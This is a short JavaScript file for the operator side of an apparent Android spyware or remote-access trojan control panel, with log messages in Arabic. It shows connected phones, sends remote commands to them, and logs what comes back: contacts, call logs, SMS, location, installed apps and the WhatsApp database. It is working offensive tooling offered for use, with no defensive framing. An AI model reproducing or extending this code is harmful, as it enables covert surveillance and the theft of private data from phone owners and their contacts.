const socket = io();
socket.emit('adminJoin');

let devices = {};

socket.on('join', (device) => {
  devices[device.id] = device;
  updateDeviceList();
  addLog(`جهاز متصل: ${device.id} (${device.model})`);
});

socket.on('updateDevices', updated => {
  devices = updated;
  updateDeviceList();
});

const events = ['getInstalledApps','getContacts','getCallLog','getSMS','getLocation','downloadWhatsappDatabase'];
events.forEach(ev => {
  socket.on(ev, data => addLog(`${ev} من ${data.id}: ${JSON.stringify(data.data)}`));
});

function updateDeviceList() {
  const ul = document.getElementById('deviceList');
  const select = document.getElementById('deviceSelect');
  ul.innerHTML = ''; select.innerHTML = '';
  Object.values(devices).forEach(d => {
    const li = document.createElement('li');
    li.textContent = `${d.id} (${d.model})`;
    ul.appendChild(li);

    const opt = document.createElement('option');
    opt.value = d.id;
    opt.textContent = `${d.id} (${d.model})`;
    select.appendChild(opt);
  });
}

function addLog(msg) {
  const ul = document.getElementById('logList');
  const li = document.createElement('li');
  li.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  ul.appendChild(li);
  ul.scrollTop = ul.scrollHeight;
}

document.getElementById('sendCommand').addEventListener('click', () => {
  const to = document.getElementById('deviceSelect').value;
  const action = document.getElementById('commandAction').value;
  let data = document.getElementById('commandData').value.trim();
  if(data){ try{ data=JSON.parse(data); } catch(e){ addLog('خطأ: بيانات JSON غير صالحة'); return; } } else data = null;
  socket.emit('request', JSON.stringify({to, action, data}));
  addLog(`تم إرسال الأمر: ${action} إلى ${to}`);
});
